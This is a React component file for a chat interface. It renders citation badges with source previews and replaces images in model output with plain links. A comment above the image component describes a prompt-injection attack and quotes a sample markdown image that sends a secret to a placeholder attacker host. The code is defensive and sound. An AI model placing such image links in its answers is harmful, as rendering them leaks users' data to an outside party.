/** Building blocks for markdown answers: citation badges and blocked images. */
import * as React from "react";
import Paper from "@mui/material/Paper";
import Popper from "@mui/material/Popper";
import Fade from "@mui/material/Fade";
import Typography from "@mui/material/Typography";
import DescriptionOutlinedIcon from "@mui/icons-material/DescriptionOutlined";
import TableChartOutlinedIcon from "@mui/icons-material/TableChartOutlined";
import ImageNotSupportedOutlinedIcon from "@mui/icons-material/ImageNotSupportedOutlined";
import styles from "../../styles/chat.module.scss";
import { displayPage, type SourceItem } from "./chat-sources";

const EXCERPT_PREVIEW_CHARS = 200;

function CitedIndicator() {
  return (
    <span className={`${styles.relevancePill} ${styles.relevanceCited}`}>
      <span className={styles.relevanceDot} />
      Cited in response
    </span>
  );
}

export function CitationBadge({
  source,
  onCitationClick,
}: {
  source: SourceItem;
  onCitationClick?: (chunkIndex: number) => void;
}) {
  const [anchorEl, setAnchorEl] = React.useState<HTMLElement | null>(null);
  const clickable = source.chunkIndex != null && Boolean(onCitationClick);

  const handleClick = () => {
    if (source.chunkIndex != null && onCitationClick) {
      onCitationClick(source.chunkIndex);
    }
  };

  return (
    <>
      <button
        type="button"
        className={styles.citationBadge}
        onMouseEnter={(e) => setAnchorEl(e.currentTarget)}
        onMouseLeave={() => setAnchorEl(null)}
        onFocus={(e) => setAnchorEl(e.currentTarget)}
        onBlur={() => setAnchorEl(null)}
        onClick={handleClick}
        aria-label={`Source ${source.chunkIndex}: ${source.title}`}
      >
        {source.chunkIndex}
      </button>
      <Popper open={Boolean(anchorEl)} anchorEl={anchorEl} placement="top" transition style={{ zIndex: 1300 }}>
        {({ TransitionProps }) => (
          <Fade {...TransitionProps} timeout={150}>
            <Paper className={styles.citationCard} elevation={8}>
              <div className={styles.citationCardHeader}>
                {source.sourceType === "excelIndex" ? (
                  <TableChartOutlinedIcon sx={{ fontSize: 14, color: "text.secondary", flexShrink: 0 }} />
                ) : (
                  <DescriptionOutlinedIcon sx={{ fontSize: 14, color: "text.secondary", flexShrink: 0 }} />
                )}
                <Typography variant="subtitle2" className={styles.citationCardTitle} noWrap>
                  {source.title}
                </Typography>
              </div>
              <div className={styles.citationCardMeta}>
                {source.cited && <CitedIndicator />}
                {source.page != null && source.cited && <span className={styles.metaDivider}>·</span>}
                {source.page != null && (
                  <Typography variant="caption" sx={{ fontSize: "0.6875rem", color: "text.secondary" }}>
                    Page {displayPage(source.page)}
                  </Typography>
                )}
              </div>
              {source.excerpt && (
                <Typography variant="body2" className={styles.citationExcerpt}>
                  {source.excerpt.length > EXCERPT_PREVIEW_CHARS
                    ? source.excerpt.slice(0, EXCERPT_PREVIEW_CHARS) + "..."
                    : source.excerpt}
                </Typography>
              )}
              {clickable && (
                <Typography
                  variant="caption"
                  sx={{ color: "primary.main", mt: 0.5, display: "block", fontSize: "0.6875rem" }}
                >
                  Click to view source
                </Typography>
              )}
            </Paper>
          </Fade>
        )}
      </Popper>
    </>
  );
}

/**
 * Never load images from model output: a prompt-injected document could make
 * the answer include `![](https://attacker/?q=<secret>)` and the browser would
 * leak data just by rendering it. Show a link the user can choose to open.
 */
export function MarkdownImage({ src, alt }: { src?: string; alt?: string }) {
  const label = alt?.trim() || "image";
  const isWebUrl = typeof src === "string" && /^https?:\/\//i.test(src);
  return (
    <span className={styles.blockedImage}>
      <ImageNotSupportedOutlinedIcon sx={{ fontSize: 14, verticalAlign: "-2px", mr: 0.5 }} aria-hidden="true" />
      {isWebUrl ? (
        <a href={src} target="_blank" rel="noopener noreferrer nofollow">
          {label} (external image, not loaded)
        </a>
      ) : (
        <span>{label} (image not shown)</span>
      )}
    </span>
  );
}
